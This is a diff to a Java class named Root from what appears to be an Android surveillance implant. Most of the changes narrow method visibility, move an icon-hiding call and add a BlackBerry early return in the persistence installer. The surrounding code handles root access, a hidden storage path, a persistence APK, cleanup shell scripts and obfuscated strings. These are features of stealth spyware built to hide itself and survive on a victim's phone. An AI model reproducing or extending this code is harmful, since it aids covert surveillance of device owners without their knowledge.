@@ -84,7 +84,7 @@ public class Root {
 		return false;
 	}
 
-	static public boolean isNotificationNeeded() {
+	static private boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
 
@@ -95,7 +95,7 @@ public class Root {
 		return false;
 	}
 
-	static public boolean shouldAskForAdmin() {
+	public static boolean shouldAskForAdmin() {
 		boolean ret = false;
 
 		if( Status.isBlackberry()){
@@ -227,7 +227,7 @@ public class Root {
 	}
 
 
-	static public void adjustOom() {
+	static private void adjustOom() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
@@ -275,7 +275,7 @@ public class Root {
 		}
 	}
 
-	public static Boolean saveSerToFile(AutoFile f, Serializable s) {
+	private static Boolean saveSerToFile(AutoFile f, Serializable s) {
 		try {
 			OutputStream file = new FileOutputStream(f.getFile());
 			OutputStream buffer = new BufferedOutputStream(file);
@@ -291,7 +291,7 @@ public class Root {
 		return false;
 	}
 
-	public static Serializable getSerFromFile(AutoFile f) {
+	private static Serializable getSerFromFile(AutoFile f) {
 		Serializable res = null;
 		try {
 			InputStream file = new FileInputStream(f.getFile());
@@ -347,8 +347,8 @@ public class Root {
 		String packageName = Status.self().getAppContext().getPackageName();
 		String apkPath = Status.getApkName();
 		if (apkPath != null) {
+				Status.setIconState(false);
 
-			Status.setIconState(false);
 			//String script = M.e("#!/system/bin/sh") + "\n";
 			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
@@ -370,8 +370,6 @@ public class Root {
 				 * 3) /data/system/packages-stopped.xml does it really exist
 				 * 4) add at the end of the scrip /data/app/<apkPath>.apk removal
 				 */
-
-			// the
 
 			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
 			if(!Status.isPersistent()){
@@ -865,6 +863,10 @@ public class Root {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (installPersistence): tryInstall PERSISTENCE=" + Cfg.PERSISTENCE + " root=" + Status.haveRoot() + " status=" + Status.getPersistencyStatus() + " isGuiVisible= " +
 					Status.isGuiVisible());
+		}
+
+		if(Status.isBlackberry()){
+			return;
 		}
 
 		synchronized(Status.uninstallLock) {
